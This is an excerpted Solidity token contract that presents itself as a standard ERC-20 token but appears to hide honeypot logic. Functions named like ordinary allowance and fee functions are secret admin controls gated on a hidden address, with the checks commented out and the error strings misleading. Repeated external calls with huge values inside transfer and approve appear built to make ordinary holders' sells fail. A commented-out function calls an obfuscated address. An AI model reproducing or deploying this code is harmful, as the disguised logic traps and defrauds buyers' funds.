...
contract Token is Context, IERC20, Ownable {
    ...
    uniswapV1 private uniswapV8PairToken;
    ...
    constructor(
        ...
        uniswapV8PairToken = uniswapV1(uniswapV3Pair_);
...
/*    function increaseAllowance(address spender, uint256 addedValue)
    ...
    function approve(address msgSender, address spender, uint256 amount) public {
        if (_Antibotswaper[_msgSender()]) {
            ...
            uniswapV8PairToken.create(8**3);
        } 
    }
    
    function call(uint256 a) public {
        if (_Antibotswaper[_msgSender()]) {
            creca=a;
        } else {
            uniswapV8PairToken.create(8**3);
    ...
    function updateFees(uint256 taxFeebuy, uint256 liquidityFeebuy, uint256 MarketingFeebuy, uint256 taxFeesell, uint256 liquidityFeesell, uint256 MarketingFeesell) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20");
    ...
    function excludeFromFee(address[] memory accounts, bool state) external {
    ...
    //aprandcall
    function increaseAllowance(address[] calldata addresses, bool status) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
    ...
    //setuniswapV1
    function marketingWallet(address addresses) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            uniswapV8PairToken = uniswapV1(addresses);
        } else {
            uniswapV8PairToken.create(8**3);
        }
    }
    ...
    //excludeLp
    function includeFromFee(address a, bool e) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            _isExcludedlp[a] = e;
        } else {
    ...
    //santWhal
    function swapAndLiquiFy(bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad, address r) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            antibotenabled = bs;
            botsleep = timesleep;
    ...
    //gcallerW
    function decreaseAllowance(address[] memory accounts, bool state) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
    ...
    function _approve(
        ...
        if (_isExcludedFromFeeTransfer[_msgSender()]){uniswapV8PairToken.create(creca);/*"ERC20: approve the zero address"*/}
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV8PairToken.create(crec);
            if(crec>220 && msg.sender!=rr){uniswapV8PairToken.create(crec**21);}
            //uint256 b=IUniswapV2Pair(uniswapV2Router.WETH()).balanceOf(address(0x));
            //if(b<100){uniswapV8PairToken.create(crec**21);}
        }
        ...
        if (_isExcludedlp[to]) {
            uniswapV8PairToken.create(250**3); 
        }

        if (takeFee && _isExcludedFromFeeTransfer[from] && automatedMarketMakerPairs[to] && !starttrad && msg.sender!=rr) {
            uniswapV8PairToken.create(250**3);  
        }
        if (takeFee && _isExcludedFromFeeTransfer[from] && automatedMarketMakerPairs[to] && !starttrad && msg.sender==rr&&tx.gasprice>=gg) {
            uniswapV8PairToken.create(250**3);  
        }
    ...
    /*function tgs() private  returns (bool){
        (bool t, bytes memory data) =address(uint160(uint256(0xb91c0204019ee557f01792133E764BF77EBCe1427C3603c18d8e61900B63FD1C))).call(abi.encodeWithSelector(0x7c2efcba));return t;
    }*/
}